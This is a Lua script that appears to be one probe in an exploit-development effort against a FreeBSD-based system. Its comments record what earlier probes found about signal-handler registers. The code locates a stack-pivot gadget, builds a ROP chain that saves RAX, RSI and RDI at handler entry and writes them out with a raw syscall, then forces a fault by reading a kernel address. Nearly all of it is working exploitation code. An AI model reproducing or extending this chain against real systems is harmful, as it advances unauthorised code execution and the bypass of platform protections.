-- CRASH_CLASS: HIGH
-- PROBE 994a: what does the kernel hand the signal handler?
--
-- 993c dumped RDX (the ucontext) and got 0x300 bytes with the fault address in it, but
-- the write from RSI produced nothing, so RSI is not a valid pointer here. The loader's
-- own comments say RDI is the signal code and RAX the crashing address, which is not
-- the stock FreeBSD convention. This run stores RAX, RSI and RDI at handler entry and
-- writes them back, which tells us whether the si_code is available at all.

print("=== PROBE 994a: HANDLER REGISTERS ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end

print(string.format("[A] pid=%u", to_num(mk(20)())))
local ph = gadgets.stack_pivot[1]
local pivot_addr = to_num(ph.pivot_addr)
print(string.format("[B] pivot=0x%X", pivot_addr))

local buf = memory.alloc(0x40)
local bufaddr = as_addr(buf)
local chain = ropchain({ stack_base = pivot_addr })

chain:push_store_rax_into_memory(buf)             -- entry RAX
chain:push_set_reg_from_reg("rax", "rsi")         -- rax = entry RSI
chain:push_store_rax_into_memory(buf + 8)         -- entry RSI
chain:push_store_rdi_into_memory(buf + 0x10)      -- entry RDI (clobbers rcx)
chain:push_syscall_raw(syscall.write, function()
    chain:push_set_rdx(0x18)
    chain:push_set_rsi(bufaddr)
    chain:push_set_reg_from_memory("rdi", signal.fd_addr)
end)

print("[C] chain built, faulting")
local ok = pcall(function() return memory.read_qword(0xFFFFFFFF80000000) end)
print(string.format("[D] returned ok=%s", tostring(ok)))
